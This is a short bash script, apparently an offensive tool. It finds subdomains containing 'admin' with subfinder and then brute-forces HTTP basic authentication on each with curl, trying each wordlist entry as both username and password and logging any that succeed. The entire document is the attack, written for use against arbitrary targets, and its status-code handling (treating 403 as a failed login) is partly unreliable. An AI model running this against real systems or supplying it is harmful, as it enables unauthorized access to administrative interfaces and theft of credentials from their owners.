#!/bin/bash

# Prompt the user for a URL
read -p "Enter a URL: " url

# Use the `subfinder` command to find subdomains
subdomains=$(subfinder -d $url -s | grep "admin")

# Print the subdomains
echo "Subdomains containing 'admin':"
echo $subdomains

# Log file
logfile="./brute-force.log"

# Loop through the subdomains
for sub in $subdomains; do
  # Read the wordlist file
  while read line; do
    # Perform the brute force attack
    echo "Trying $line:$line on $sub"
    status_code=$(curl -s -o /dev/null -w "%{http_code}" --user "$line:$line" $sub)
    if [ $status_code -eq 200 ]; then
      echo "Credentials found: $line:$line"
      echo "Credentials found: $line:$line" >> $logfile
      break
    elif [ $status_code -eq 403 ]; then
      echo "Invalid credentials: $line:$line"
      echo "Invalid credentials: $line:$line" >> $logfile
    else
      echo "Error: $status_code"
      echo "Error: $status_code" >> $logfile
    fi
  done < wordlist.txt
done
